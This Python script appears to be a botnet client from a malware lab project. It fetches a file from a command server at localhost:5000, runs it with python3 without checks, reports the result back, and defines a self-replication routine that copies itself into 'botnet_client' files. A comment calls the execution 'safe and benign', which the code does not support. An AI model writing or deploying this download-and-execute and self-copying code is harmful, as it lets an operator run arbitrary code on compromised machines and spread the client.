import requests
import subprocess
import shutil
import os

# URL of the API server
API_URL = "http://localhost:5000"

def download_and_execute():
    # Download the file
    response = requests.get(f"{API_URL}/download")
    filename = 'downloaded_file.txt'

    with open(filename, 'wb') as file:
        file.write(response.content)

    # Execute the file (safely and benignly)
    subprocess.run(["python3", filename], check=True)

    return filename

def report_result(result):
    requests.post(f"{API_URL}/report", json={"result": result})

def replicate_script(replication_count):
    if replication_count > 0:
        source = __file__
        destination = f'/home/kali/MWProj/Replicants/botnet_client_{replication_count}.py'
        shutil.copy(source, destination)

if __name__ == "__main__":
    result = download_and_execute()
    report_result(result)

